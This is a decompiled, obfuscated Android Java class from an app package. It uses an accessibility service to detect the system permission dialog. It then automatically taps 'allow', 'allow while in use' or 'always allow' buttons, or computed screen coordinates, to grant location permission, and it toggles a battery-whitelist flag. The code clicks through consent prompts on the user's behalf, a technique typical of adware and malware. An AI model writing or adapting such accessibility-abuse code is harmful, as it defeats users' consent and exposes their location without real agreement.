package com.acse.ottn.p042d;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Rect;
import android.os.Build;
import android.view.accessibility.AccessibilityNodeInfo;
import com.acse.ottn.util.C1617A;
import com.acse.ottn.util.C1661ba;
import com.acse.ottn.util.C1684n;
import com.acse.ottn.util.C1694ra;
import com.mbridge.msdk.MBridgeConstans;
import java.io.ObjectStreamException;

/* renamed from: com.acse.ottn.d.j */
/* loaded from: E:\fuckcool\tsn\6276784.dex */
public class C1532j {

    /* renamed from: a */
    private static C1532j f2833a = null;

    /* renamed from: b */
    private static String f2834b = "OpenMobileLocationPermissionUtil";

    private C1532j() {
    }

    /* renamed from: a */
    public static C1532j m56496a() {
        if (f2833a == null) {
            synchronized (C1532j.class) {
                if (f2833a == null) {
                    f2833a = new C1532j();
                }
            }
        }
        return f2833a;
    }

    /* renamed from: b */
    private Object m56494b() throws ObjectStreamException {
        return f2833a;
    }

    /* renamed from: a */
    public boolean m56495a(AccessibilityService accessibilityService, String str) {
        C1694ra.m55917a(f2834b, "openPermission");
        if (str.contains(MBridgeConstans.APPLICATION_STACK_COM_ANDROID) && str.contains(".ui.GrantPermissionsActivity")) {
            C1617A.m56331b().m56320c(accessibilityService);
            if (C1661ba.m56097a().m56096a("battery_white")) {
                C1661ba.m56097a().m56092a("battery_white", false);
                C1684n.m55975c().m56005a(300L);
                String m56086d = C1661ba.m56097a().m56086d("location_permission_state");
                if (m56086d.equals("1")) {
                    AccessibilityNodeInfo m55996a = C1684n.m55975c().m55996a(accessibilityService, "允许本次使用", true);
                    if (m55996a != null) {
                        C1684n.m55975c().m55958f(m55996a);
                        return true;
                    }
                    AccessibilityNodeInfo m55996a2 = C1684n.m55975c().m55996a(accessibilityService, "仅在使用中允许", true);
                    if (m55996a2 != null) {
                        C1684n.m55975c().m55958f(m55996a2);
                        return true;
                    }
                    AccessibilityNodeInfo m55996a3 = C1684n.m55975c().m55996a(accessibilityService, "仅使用期间允许", true);
                    if (m55996a3 != null) {
                        C1684n.m55975c().m55958f(m55996a3);
                        return true;
                    }
                    AccessibilityNodeInfo m55996a4 = C1684n.m55975c().m55996a(accessibilityService, "本次使用允许", true);
                    if (m55996a4 != null) {
                        C1684n.m55975c().m55958f(m55996a4);
                        return true;
                    }
                    AccessibilityNodeInfo m55996a5 = C1684n.m55975c().m55996a(accessibilityService, "本次运行允许", true);
                    if (m55996a5 != null) {
                        C1684n.m55975c().m55958f(m55996a5);
                        return true;
                    }
                    AccessibilityNodeInfo m55996a6 = C1684n.m55975c().m55996a(accessibilityService, "本次使用时允许", true);
                    if (m55996a6 != null) {
                        C1684n.m55975c().m55958f(m55996a6);
                        return true;
                    }
                    AccessibilityNodeInfo m55996a7 = C1684n.m55975c().m55996a(accessibilityService, "仅本次使用时允许", true);
                    if (m55996a7 != null) {
                        C1684n.m55975c().m55958f(m55996a7);
                        return true;
                    }
                    AccessibilityNodeInfo m55996a8 = C1684n.m55975c().m55996a(accessibilityService, "允许", true);
                    if (m55996a8 != null) {
                        C1684n.m55975c().m55958f(m55996a8);
                        return true;
                    }
                } else if (m56086d.equals("2")) {
                    AccessibilityNodeInfo m55953h = C1684n.m55975c().m55953h(accessibilityService, "权限管理");
                    if (m55953h != null) {
                        Rect rect = new Rect();
                        m55953h.getBoundsInScreen(rect);
                        int i = (rect.left + rect.right) / 2;
                        String str2 = f2834b;
                        C1694ra.m55917a(str2, "x=" + i);
                        int i2 = rect.bottom;
                        int i3 = rect.top;
                        int i4 = ((i2 - i3) / 2) + i3;
                        if (Build.VERSION.SDK_INT >= 24) {
                            C1661ba.m56097a().m56092a("battery_white", true);
                            C1684n.m55975c().m56002a(accessibilityService, i, i4);
                            C1694ra.m55917a(f2834b, "点击了");
                            return true;
                        }
                    }
                    AccessibilityNodeInfo m55953h2 = C1684n.m55975c().m55953h(accessibilityService, "始终允许");
                    if (m55953h2 != null) {
                        C1694ra.m55917a(f2834b, m55953h2.toString());
                        if (m55953h2.getText().equals("始终允许")) {
                            C1684n.m55975c().m55958f(m55953h2);
                            return true;
                        } else if (m55953h2.getText().toString().equals("若同意，您可以去设置为始终允许。")) {
                            Rect rect2 = new Rect();
                            m55953h2.getBoundsInScreen(rect2);
                            int i5 = rect2.right - rect2.left;
                            String str3 = f2834b;
                            C1694ra.m55917a(str3, "x=" + i5);
                            int i6 = rect2.bottom;
                            int i7 = rect2.top;
                            int i8 = ((i6 - i7) / 2) + i7;
                            if (Build.VERSION.SDK_INT >= 24) {
                                if (C1684n.m55975c().m56002a(accessibilityService, i5, i8)) {
                                    C1684n.m55975c().m56005a(1000L);
                                    C1684n.m55975c().m56002a(accessibilityService, i5, i8);
                                }
                                C1694ra.m55917a(f2834b, "点击了");
                                C1661ba.m56097a().m56092a("battery_white", true);
                            }
                            return true;
                        }
                    }
                    AccessibilityNodeInfo m55953h3 = C1684n.m55975c().m55953h(accessibilityService, "在“设置”中允许");
                    if (m55953h3 != null) {
                        C1694ra.m55917a(f2834b, "在“设置”中允许");
                        Rect rect3 = new Rect();
                        m55953h3.getBoundsInScreen(rect3);
                        int i9 = (rect3.left + rect3.right) / 2;
                        String str4 = f2834b;
                        C1694ra.m55917a(str4, "x=" + i9);
                        int i10 = rect3.bottom + (-30);
                        if (Build.VERSION.SDK_INT >= 24) {
                            C1684n.m55975c().m56002a(accessibilityService, i9, i10);
                            C1694ra.m55917a(f2834b, "点击了");
                            C1661ba.m56097a().m56092a("battery_white", true);
                        }
                        return true;
                    }
                    AccessibilityNodeInfo m55953h4 = C1684n.m55975c().m55953h(accessibilityService, "去设为始终允许");
                    if (m55953h4 != null) {
                        Rect rect4 = new Rect();
                        m55953h4.getBoundsInScreen(rect4);
                        int i11 = (rect4.left + rect4.right) / 2;
                        String str5 = f2834b;
                        C1694ra.m55917a(str5, "x=" + i11);
                        int i12 = rect4.bottom + (-30);
                        if (Build.VERSION.SDK_INT >= 24) {
                            C1684n.m55975c().m56002a(accessibilityService, i11, i12);
                            C1694ra.m55917a(f2834b, "点击了");
                            C1661ba.m56097a().m56092a("battery_white", true);
                        }
                        return true;
                    }
                    AccessibilityNodeInfo m55996a9 = C1684n.m55975c().m55996a(accessibilityService, "允许", true);
                    if (m55996a9 != null) {
                        C1684n.m55975c().m55958f(m55996a9);
                    }
                }
                return true;
            }
            return true;
        }
        return false;
    }
}
